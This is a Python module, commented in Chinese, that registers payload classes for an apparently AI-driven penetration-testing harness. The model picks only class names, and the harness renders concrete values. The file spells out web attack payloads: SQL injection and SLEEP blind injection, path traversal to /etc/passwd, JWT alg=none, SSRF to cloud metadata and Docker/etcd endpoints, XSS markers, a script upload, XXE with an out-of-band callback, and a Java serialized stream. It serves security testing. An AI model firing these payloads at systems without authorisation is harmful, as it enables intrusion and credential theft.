"""Payload Class Registry。

模型只能选"类"，不能给原文。每个类在这里被实例化成具体值，
{nonce}/{oob} 由 harness 填充，模型无权控制。
"""
from __future__ import annotations

import json
import os
import random
import string
from dataclasses import dataclass
from typing import Dict, Optional

from .errors import PayloadRejected

ALPHABET = string.ascii_lowercase + string.digits


def nonce(n: int = 8) -> str:
    return "".join(random.choice(ALPHABET) for _ in range(n))


@dataclass(frozen=True)
class PayloadClass:
    name: str
    description: str
    render: str          # 具体注入值，{nonce} 会被替换
    placement: str = "value"  # value | json_field | header | path
    level_floor: str = "L1"
    # append：把载荷接在原值后面（`?id=1` → `?id=1'`），SQL 注入类必须这样，
    # 否则 `WHERE id='%s'` 会变成 `WHERE id='' AND …`，真假两个条件都返回空集。
    # replace：本类给的就是完整新值（ID 位移、内网 URL、OOB 地址）。
    mode: str = "replace"
    # 非空表示"本类载荷整体替换请求体"，并且由 payload 自己决定 Content-Type
    # （multipart 上传、XML 实体、序列化字节流都不是 JSON，塞不进 json.dumps）。
    # 这比在 executor 里再开一个 body_kind 分支更省事：content-type 是载荷的属性，
    # 不是请求的属性。
    content_type: Optional[str] = None
    # content_type 非空时，render 出来的字符串按这个编码落成字节。
    # Java 序列化流的魔术字节 0xAC 0xED 不能被 UTF-8 重编码成两个字节，
    # 否则服务端第一眼就当成"不是序列化数据"，判定链直接失效。
    encoding: str = "utf-8"
    # 数值类载荷要写成 JSON 数字，不能写成字符串。
    # `{"amount":"-100"}` 测的是"字符串被接受"，服务端 float() 一下也过，
    # 但那不等于"负数被当成合法金额"。
    numeric: bool = False


REGISTRY: Dict[str, PayloadClass] = {}


def _reg(p: PayloadClass) -> PayloadClass:
    REGISTRY[p.name] = p
    return p


_reg(PayloadClass("syntax_break", "单引号断句，用于触发报错/语法差异", "'", mode="append"))
_reg(PayloadClass("boolean_true", "恒真比较", "' AND '1'='1", mode="append"))
_reg(PayloadClass("boolean_false", "恒假比较", "' AND '1'='2", mode="append"))
_reg(PayloadClass("delay_short", "短延时用于时间盲注", "' AND SLEEP(2)-- -",
                  level_floor="L2", mode="append"))
_reg(PayloadClass("unique_marker", "唯一标记串，用 {nonce} 保证可归因", "pta{nonce}"))
_reg(PayloadClass("external_url", "外部 marker URL（开放重定向；只观察 Location，不跟跳）",
                  "https://redirect.test/{nonce}"))
_reg(PayloadClass("oob_url", "带外回连地址", "http://{oob}/{nonce}", level_floor="L2"))
_reg(PayloadClass("traversal_path", "路径穿越：读 /etc/passwd", "../../../../etc/passwd"))
_reg(PayloadClass("traversal_path_win", "路径穿越：读 win.ini", "..\\..\\..\\..\\windows\\win.ini"))
_reg(PayloadClass("wellknown_path", "已知敏感路径", "/.git/HEAD"))
_reg(PayloadClass("alg_or_claim", "JWT 算法/声明篡改（字面量）", '"alg":"none"'))
_reg(PayloadClass("jwt_forged", "用当前身份的真实 token 伪造签名（alg=none / 去签名）",
                  "{jwt_forged}", placement="header"))
_reg(PayloadClass("extra_field", "批量赋值附加字段", '{"role":"admin","is_admin":true}', placement="json_field"))
_reg(PayloadClass("write_marker", "写操作标记：给可写字段塞一个可归因的串，回读能看到就算写入生效",
                  "pta{nonce}", placement="json_field", level_floor="L2"))
_reg(PayloadClass("id_shift", "相邻对象 ID（IDOR）", "{id_plus_one}"))
_reg(PayloadClass(
    "internal_metadata_url",
    "云元数据服务（169.254.169.254）：回显带 ami-id / instance-id / security-credentials 就算通",
    "http://169.254.169.254/latest/meta-data/", level_floor="L2"))
_reg(PayloadClass(
    "internal_docker_url",
    "本机 Docker API：/version 回显带 ApiVersion / MinAPIVersion 就算通",
    "http://127.0.0.1:2375/version", level_floor="L2"))
_reg(PayloadClass(
    "internal_etcd_url",
    "本机 etcd：/version 回显带 etcdserver / etcdcluster 就算通",
    "http://127.0.0.1:2379/version", level_floor="L2"))
_reg(PayloadClass(
    "xss_marker",
    "自带执行证据的反射标记：脚本写 window.name 并给 body 打属性",
    '<img src=x onerror="window.name=\'{nonce}\';document.body.setAttribute(\'data-pta-xss\',\'{nonce}\')">',
))

_reg(PayloadClass(
    "stored_xss_marker",
    "存储型 XSS 标记：写进可写字段，回读时看 data-pta 属性有没有被原样渲染",
    # 故意用属性而不是 onerror 里的 JS：回读判定只看"`data-pta` 是否原样出现"，
    # 不依赖目标真的执行脚本。判 XSS 要靠"浏览器会执行"，而"属性在标签里没被转义"
    # 已经是这个前提的可验证替身（执行与否归浏览器档演示，不归 HTTP 判定）。
    '<img src=x data-pta="pta{nonce}" onerror="void(0)">',
    placement="json_field", level_floor="L2"))

_reg(PayloadClass(
    "negative_number",
    "负数金额/数量：看服务端是否把负值当合法值收下来（转账方向会反过来）",
    "-100", placement="json_field", level_floor="L2", numeric=True))

_reg(PayloadClass(
    "huge_number",
    "超出字段上限的数量：拦截通常就发生在「范围校验」这一层，没拦说明没做",
    "999999999", placement="json_field", level_floor="L2", numeric=True))

# ---- 下面三类载荷"整体替换请求体"，由载荷自己声明 Content-Type ----
_UPLOAD_BOUNDARY = "ptaboundary7d31c1f0b9a4"
_UPLOAD_NAME = "pta_upload.html"

_reg(PayloadClass(
    "upload_shell",
    "multipart 上传一个带标记的 html/脚本文件；回读命中标记即文件可被当资源取回",
    ("--%s\r\n"
     "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
     "Content-Type: text/html\r\n"
     "\r\n"
     "<script>document.title='pta{nonce}'</script>\r\n"
     "--%s--\r\n") % (_UPLOAD_BOUNDARY, _UPLOAD_NAME, _UPLOAD_BOUNDARY),
    content_type="multipart/form-data; boundary=%s" % _UPLOAD_BOUNDARY,
    level_floor="L2",
))

_reg(PayloadClass(
    "xxe_entity",
    "XML 外部实体：文档体内引用带 {oob} 的实体，解析器去取它就会回连",
    ("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n"
     "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{oob}\">]>\r\n"
     "<r>&xxe;</r>\r\n"),
    content_type="application/xml",
    level_floor="L2",
))

_reg(PayloadClass(
    "deser_java",
    "Java 序列化流（魔术字节 + 不存在的类名）：被反序列化时会报 ClassNotFoundException",
    "\xac\xed\x00\x05\x73\x72\x00\x0cptapayload01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70",
    content_type="application/x-java-serialized-object",
    encoding="latin-1",
    level_floor="L2",
))


def upload_file_name() -> str:
    """上传载荷写死文件名：回读时 executor 要靠它拼出 URL。
    固定名让"回读哪个路径"可预测，{nonce} 只出现在文件内容里做归因。"""
    return _UPLOAD_NAME


def render(name: str, *, nonce_value: Optional[str] = None, oob: Optional[str] = None,
           id_plus_one: Optional[str] = None) -> str:
    """把类渲染成实际的注入值。未知类直接失败，不允许透传模型原文。"""
    cls = REGISTRY.get(name)
    if cls is None:
        raise PayloadRejected("未注册的载荷类：%s" % name)
    n = nonce_value or nonce()
    out = cls.render.replace("{nonce}", n)
    if "{oob}" in out:
        if not oob:
            raise PayloadRejected("载荷类 %s 需要 OOB 通道但未配置" % name)
        out = out.replace("{oob}", oob)
    if "{id_plus_one}" in out:
        if id_plus_one is None:
            raise PayloadRejected("载荷类 %s 需要 id_plus_one" % name)
        out = out.replace("{id_plus_one}", str(id_plus_one))
    if "{jwt_forged}" in out:
        raise PayloadRejected("载荷类 %s 必须由 harness 用真实 token 现场伪造，不接受字面值" % name)
    return out


def describe() -> Dict[str, dict]:
    return {k: {"description": v.description, "placement": v.placement,
                "level_floor": v.level_floor, "content_type": v.content_type}
            for k, v in REGISTRY.items()}


def level_floor(name: str) -> str:
    cls = REGISTRY.get(name)
    if cls is None:
        raise PayloadRejected("未注册的载荷类：%s" % name)
    return cls.level_floor
